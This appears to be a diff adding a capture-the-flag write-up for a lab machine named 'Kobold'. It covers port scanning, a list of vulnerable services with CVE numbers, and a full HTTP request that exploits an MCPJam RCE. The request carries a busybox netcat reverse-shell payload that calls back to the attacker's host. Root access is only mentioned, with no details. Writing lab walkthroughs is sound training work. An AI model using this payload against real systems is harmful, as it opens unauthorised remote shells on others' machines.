@@ -1,0 +1,83 @@
+[Profile]{
+Machine: Kobold
+ip: 10.129.36.101
+OS: Linux
+}
+
+[Enumeration]{
+nmap -sC -sV -Pn 10.129.36.101
+\ 22/tcp   open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
+  80/tcp  open  http     nginx 1.24.0 (Ubuntu)
+  443/tcp  open  ssl/http     nginx 1.24.0 (Ubuntu)
+  3552/tcp open  http     Golang net/http server
+
+while enumerating, we discover the following services:
+PrivateBin 2.0.2
+MCPJam v1.4.2
+Arcane 1.13.0
+
+Well, that is a lot of services, let's look into it !
+
+- PrivateBin 2.0.2
+LFI with potential rce CVE-2026-64714
+
+- MCPJam 1.4.2
+Remote Code Execution CVE-2026-23744
+
+- Arcane 1.13.0
+OS Command Injection ( in the updater service ) CVE-2026-23520
+Unauthenticated SSRF with conditionnal response reflection cve-2026-40242
+
+}
+
+[Exploitation]{
+I use the MCPJam exploit( RCE ) to get in. The request sent was like this:
+```Burpsuite
+POST /api/mcp/connect HTTP/1.1
+Host: mcp.kobold.htb
+Content-Type: application/json
+Cookie: ph_phc_dTOPniyUNU2kD8Jx8yHMXSqiZHM8I91uWopTMX6EBE9_posthog=%7B%22%24device_id%22%3A%22019f1ba0-0976-7630-bf47-6af688c7944d%22%2C%22distinct_id%22%3A%22019f1ba0-0976-7630-bf47-6af688c7944d%22%2C%22%24sesid%22%3A%5B1782931023377%2C%22019f1ef8-6614-71e8-8a9a-e0a0ce56e0e2%22%2C1782931023377%5D%2C%22%24initial_person_info%22%3A%7B%22r%22%3A%22%24direct%22%2C%22u%22%3A%22https%3A%2F%2Fmcp.kobold.htb%2F%22%7D%7D
+Sentry-Trace: 644b2c5983aa4962b78ccc85ef78f561-8c8e19b375346b10-0
+Sec-Ch-Ua-Platform: "Linux"
+Accept-Language: en-US,en;q=0.9
+Sec-Ch-Ua: "Chromium";v="143", "Not A(Brand";v="24"
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
+Sec-Ch-Ua-Mobile: ?0
+Baggage: sentry-environment=prod,sentry-release=af9cf6a62f550e986fe330c09b8a3b8b83136df6,sentry-public_key=c9df3785c734acfe9dad2d0c1e963e28,sentry-trace_id=644b2c5983aa4962b78ccc85ef78f561,sentry-sample_rate=0.1,sentry-sampled=false
+Accept: */*
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://mcp.kobold.htb/
+Accept-Encoding: gzip, deflate, br
+Priority: u=1, i
+Connection: keep-alive
+Content-Length: 268
+
+
+{
+    "serverConfig": {
+        "command": "busybox",
+        "args": [
+            "nc",
+            "10.10.16.236",
+            "7777",
+            "-e",
+            "/bin/bash"
+        ],
+        "env": {}
+    },
+    "serverId": "213j1l3jkljkl3j"
+}
+```
+What is important here is the endpoint, the content type and the data.
+So let's look around with our shell.
+And we got the user.txt 
+
+}
+
+[PrivEsc]{
+Then we send the Pack2Root exploit, and got the root.txt
+
+Now let's look around and see others means or explore this machine.
+}
